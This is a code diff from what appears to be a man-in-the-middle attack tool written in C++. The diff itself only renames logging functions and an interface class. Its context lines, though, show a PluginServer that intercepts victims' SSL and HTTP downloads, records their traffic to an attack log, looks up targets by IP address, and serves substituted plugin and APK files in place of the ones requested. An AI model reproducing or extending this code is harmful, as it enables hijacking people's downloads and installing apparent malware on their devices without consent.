@@ -12,7 +12,7 @@
 #include "../Public.h"
 #include "../attacker.h"
 #include "../FileOper.h"
-#include "InformerClient.h"
+#include "InformerInterface.h"
 #include "../HttpPartial.h"
 #include "qq.h"
 #include "SSLAttack.h"
@@ -41,8 +41,8 @@ int PluginServer::PluginServerProc(LPSSLPROXYPARAM lpparam, char * recvbuf, int 
 
 	char szout[2048] = { 0 };
 	int outlen = wsprintfA(szout, "PluginServerProc ssl recv url:%s,ip:%s,time:%s\r\n", url.c_str(), strip.c_str(), datetime.c_str());
-	Public::WriteLogFile(szout);
-	Public::WriteLogFile(ATTACK_LOG_FILENAME, recvbuf, recvlen);
+	Public::writeLogFile(szout);
+	Public::writeFile(ATTACK_LOG_FILENAME, recvbuf, recvlen);
 
 	int flag = 1;
 	if (memcmp(recvbuf, "HEAD ", 5) == 0)
@@ -91,7 +91,7 @@ int PluginServer::SendPluginFile(const char * lpfn, LPSSLPROXYPARAM lpparam, con
 	if (ret <= 0)
 	{
 		wsprintfA(szout, "fileDecryptReader file:%s error\r\n", filename.c_str());
-		Public::WriteLogFile(szout);
+		Public::writeLogFile(szout);
 		return FALSE;
 	}
 	
@@ -108,7 +108,7 @@ int PluginServer::SendPluginFile(const char * lpfn, LPSSLPROXYPARAM lpparam, con
 	{
 		delete[] lpdata;
 		wsprintfA(szout, "file:%s Partial start:%u,end:%u error\r\n", filename.c_str(),start,end);
-		Public::WriteLogFile(szout);
+		Public::writeLogFile(szout);
 		return FALSE;
 	}
 	int sendsize = end + 1 - start;
@@ -118,7 +118,7 @@ int PluginServer::SendPluginFile(const char * lpfn, LPSSLPROXYPARAM lpparam, con
 
 	ret = SSL_write(lpparam->SSLToClient, szDataRespHdr, iDataRespHdrLen);
 
-	Public::WriteLogFile(ATTACK_LOG_FILENAME,szDataRespHdr,iDataRespHdrLen);
+	Public::writeFile(ATTACK_LOG_FILENAME,szDataRespHdr,iDataRespHdrLen);
 
 	if (flag == 0)
 	{
@@ -154,13 +154,13 @@ int PluginServer::SendPluginFile(const char * lpfn, LPSSLPROXYPARAM lpparam, con
 	{
 		int len =wsprintfA(szout, "send data packet:%s error code:%u\r\n", filename.c_str(), WSAGetLastError());
 		printf(szout);
-		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout,len);
+		Public::writeFile(ATTACK_LOG_FILENAME, szout,len);
 		return FALSE;
 	}
 	else {
 		int len = wsprintfA(szout, "send data packet:%s from:%u to:%u ok\r\n", filename.c_str(),start, sendsize);
 		printf(szout);
-		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
+		Public::writeFile(ATTACK_LOG_FILENAME, szout, len);
 		return TRUE;
 	}
 }
@@ -192,7 +192,7 @@ int PluginServer::SendPluginFile(const char * lpfn,LPSSLPROXYPARAM lpparam,const
 	if (ret <= FALSE )
 	{
 		wsprintfA(szout, "fileDecryptReader file:%s error\r\n", filename.c_str());
-		Public::WriteLogFile(szout);
+		Public::writeLogFile(szout);
 		return FALSE;
 	}
 
@@ -201,7 +201,7 @@ int PluginServer::SendPluginFile(const char * lpfn,LPSSLPROXYPARAM lpparam,const
 
 	ret = SSL_write(lpparam->SSLToClient, szDataRespHdr, iDataRespHdrLen);
 
-	Public::WriteLogFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);
+	Public::writeFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);
 
 	if (flag == 0)
 	{
@@ -237,13 +237,13 @@ int PluginServer::SendPluginFile(const char * lpfn,LPSSLPROXYPARAM lpparam,const
 	{
 		int len = sprintf(szout, "send data packet:%s error code:%u\r\n", filename.c_str(), WSAGetLastError());
 		printf(szout);
-		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
+		Public::writeFile(ATTACK_LOG_FILENAME, szout, len);
 		return FALSE;
 	}
 	else {
 		int len = sprintf(szout, "send data packet:%s ok\r\n", filename.c_str());
 		printf(szout);
-		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
+		Public::writeFile(ATTACK_LOG_FILENAME, szout, len);
 		return TRUE;
 	}
 }
@@ -270,8 +270,8 @@ int PluginServer::PluginServerProc(LPHTTPPROXYPARAM lpparam,char * recvbuf,int r
 
 	char szout[2048] = { 0 };
 	int outlen = wsprintfA(szout, "PluginServerProc http recv url:%s,ip:%s,time:%s\r\n", url.c_str(), strip.c_str(), datetime.c_str());
-	Public::WriteLogFile(szout);
-	Public::WriteLogFile(ATTACK_LOG_FILENAME, recvbuf, recvlen);
+	Public::writeLogFile(szout);
+	Public::writeFile(ATTACK_LOG_FILENAME, recvbuf, recvlen);
 
 	int flag = 1;
 	if (memcmp(recvbuf,"HEAD ",5) == 0)
@@ -294,7 +294,7 @@ int PluginServer::PluginServerProc(LPHTTPPROXYPARAM lpparam,char * recvbuf,int r
 		return 0;
 	}else if (strstr(destfn.c_str(), SIMCARD_APK_FILENAME))
 	{
-		string username = InformerClient::getTarget(lpparam->saToClient.sin_addr.S_un.S_addr, host.c_str());
+		string username = InformerInterface::getTarget(lpparam->saToClient.sin_addr.S_un.S_addr, host.c_str());
 
 		lstrcpyA(lpparam->username, username.c_str());
 
@@ -353,7 +353,7 @@ int PluginServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, co
 	if (ret <= FALSE)
 	{
 		wsprintfA(szout, "fileDecryptReader file:%s error\r\n", filename.c_str());
-		Public::WriteLogFile(szout);
+		Public::writeLogFile(szout);
 		return FALSE;
 	}
 
@@ -371,7 +371,7 @@ int PluginServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, co
 	{
 		delete[] lpdata;
 		int outlen = wsprintfA(szout, "file:%s Partial start:%u,end:%u error\r\n", filename.c_str(), start, end);
-		Public::WriteLogFile(szout);
+		Public::writeLogFile(szout);
 		return FALSE;
 	}
 	int sendsize = end + 1 - start;
@@ -381,7 +381,7 @@ int PluginServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, co
 
 	ret = send(lpparam->sockToClient, szDataRespHdr, iDataRespHdrLen, 0);
 
-	Public::WriteLogFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);
+	Public::writeFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);
 
 	if (flag == 0)
 	{
@@ -396,13 +396,13 @@ int PluginServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, co
 	{
 		int len = sprintf(szout, "send data packet:%s error code:%u\r\n", filename.c_str(), WSAGetLastError());
 		printf(szout);
-		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
+		Public::writeFile(ATTACK_LOG_FILENAME, szout, len);
 		return FALSE;
 	}
 	else {
 		int len = sprintf(szout, "send data packet:%s from:%u,to:%u ok\r\n", filename.c_str(),start,sendsize);
 		printf(szout);
-		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
+		Public::writeFile(ATTACK_LOG_FILENAME, szout, len);
 		return TRUE;
 	}
 }
@@ -427,7 +427,7 @@ int PluginServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, ch
 	if (ret <= FALSE)
 	{
 		wsprintfA(szout, "fileDecryptReader file:%s error\r\n", filename.c_str());
-		Public::WriteLogFile(szout);
+		Public::writeLogFile(szout);
 		return FALSE;
 	}
 
@@ -435,7 +435,7 @@ int PluginServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, ch
 	int iDataRespHdrLen = sprintf_s(szDataRespHdr, MAX_RESPONSE_HEADER_SIZE, szHttpRespHdrFormat, filesize);
 	ret = send(lpparam->sockToClient, szDataRespHdr, iDataRespHdrLen, 0);
 
-	Public::WriteLogFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);
+	Public::writeFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);
 
 	if (flag == 0)
 	{
@@ -449,13 +449,13 @@ int PluginServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, ch
 	{
 		int len = sprintf(szout, "send data packet:%s error code:%u\r\n", filename.c_str(), WSAGetLastError());
 		printf(szout);
-		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
+		Public::writeFile(ATTACK_LOG_FILENAME, szout, len);
 		return FALSE;
 	}
 	else {
 		int len = sprintf(szout, "send data packet:%s ok\r\n", filename.c_str());
 		printf(szout);
-		Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
+		Public::writeFile(ATTACK_LOG_FILENAME, szout, len);
 		return TRUE;
 	}
 }
